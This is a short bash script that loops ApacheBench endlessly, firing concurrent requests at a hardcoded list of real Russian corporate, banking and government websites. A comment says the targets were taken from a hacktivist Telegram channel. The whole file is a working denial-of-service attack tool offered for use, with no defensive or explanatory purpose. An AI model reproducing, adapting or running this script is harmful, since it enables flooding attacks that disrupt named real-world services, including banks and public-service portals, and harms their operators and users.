#!/bin/bash

# Install apache2-utils
# apt-get install apache2-utils
# or
# dnf install httpd-tools

# Edit the list of sites according to your liking ;)
# URLs targeted from https://t.me/s/itarmyofukraine2022

sites=(
https://www.gazprom.ru/
https://lukoil.ru/
https://magnit.ru/
https://www.nornickel.com/
https://www.surgutneftegas.ru/
https://www.tatneft.ru/
https://www.evraz.com/ru/
https://nlmk.com/
https://www.sibur.ru/
https://www.severstal.com/
https://www.metalloinvest.com/
https://nangs.org/
https://rmk-group.ru/ru/
https://www.tmk-group.ru/
https://ya.ru/
https://www.polymetalinternational.com/ru/
https://www.uralkali.com/ru/
https://www.eurosib.ru/
https://omk.ru/
https://www.sberbank.ru/
https://www.vtb.ru/
https://www.gazprombank.ru/
https://www.gosuslugi.ru/
https://www.mos.ru/uslugi/
http://kremlin.ru/
http://government.ru/
https://mil.ru/
https://www.nalog.gov.ru/
https://customs.gov.ru/
https://pfr.gov.ru/
https://rkn.gov.ru/
https://mail.rkn.gov.ru/
https://cloud.rkn.gov.ru/
https://mvd.gov.ru/
https://pwd.wto.economy.gov.ru/
https://stroi.gov.ru/
https://proverki.gov.ru/
https://www.gazprom.ru/
https://privetmir.ru/
https://mironline.ru/
https://sbp.nspk.ru/
https://nspk.ru/
https://nspk.com/
)


while true
    do
        for site in "${sites[@]}"
          do
            if [[ "${site}" != "${sites[-1]}" ]]; then
              ab -k -c 100 -n 100 "${site}" &
            else
              ab -k -c 100 -n 100 "${site}"
            fi
          done
    done
